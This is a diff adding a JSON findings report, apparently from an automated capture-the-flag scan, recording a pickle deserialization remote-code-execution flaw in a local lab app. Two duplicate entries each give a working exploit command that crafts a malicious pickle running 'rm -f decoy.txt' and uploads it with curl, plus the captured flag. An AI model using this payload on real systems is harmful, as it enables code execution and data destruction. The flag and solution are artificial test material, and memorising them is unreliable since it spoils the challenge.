@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T14:15:17.537098+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "003e6ae8-ec06-4bea-a723-7245258920c0",
+      "timestamp": "2026-04-14T14:15:17.536969+00:00",
+      "title": "Pickle Deserialization RCE - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:41225",
+      "description": "The application unsafely deserializes user-uploaded pickle files, allowing remote code execution. A malicious pickle payload was crafted using `__reduce__` to execute `rm -f decoy.txt`, which forced the application to read the real flag.txt instead of the decoy.",
+      "evidence": "flag{f96e0e03-a965-4c0d-a9dd-dccb9dfcb22c}",
+      "tool_used": "custom_pickle_exploit",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "python3 -c \"import pickle,os; class E:\n def __reduce__(self): return (os.system,('rm -f decoy.txt',)); pickle.dump(E(),open('exploit.pkl','wb'))\" && curl -X POST http://172.17.0.1:41225/ -F \"pickle_file=@exploit.pkl\"",
+        "expected": "The page displays the real flag from flag.txt: flag{f96e0e03-a965-4c0d-a9dd-dccb9dfcb22c}"
+      }
+    },
+    {
+      "id": "da766dd1-2544-48f3-b3e7-a06aa3b846b0",
+      "timestamp": "2026-04-14T14:15:17.553764+00:00",
+      "title": "Pickle Deserialization RCE - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:41225",
+      "description": "The application unsafely deserializes user-uploaded pickle files, allowing remote code execution. A malicious pickle payload was crafted using `__reduce__` to execute `rm -f decoy.txt`, which forced the application to read the real flag.txt instead of the decoy.",
+      "evidence": "flag{f96e0e03-a965-4c0d-a9dd-dccb9dfcb22c}",
+      "tool_used": "custom_pickle_exploit",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "python3 -c \"import pickle,os; class E:\n def __reduce__(self): return (os.system,('rm -f decoy.txt',)); pickle.dump(E(),open('exploit.pkl','wb'))\" && curl -X POST http://172.17.0.1:41225/ -F \"pickle_file=@exploit.pkl\"",
+        "expected": "The page displays the real flag from flag.txt: flag{f96e0e03-a965-4c0d-a9dd-dccb9dfcb22c}"
+      }
+    }
+  ],
+  "diagrams": []
+}
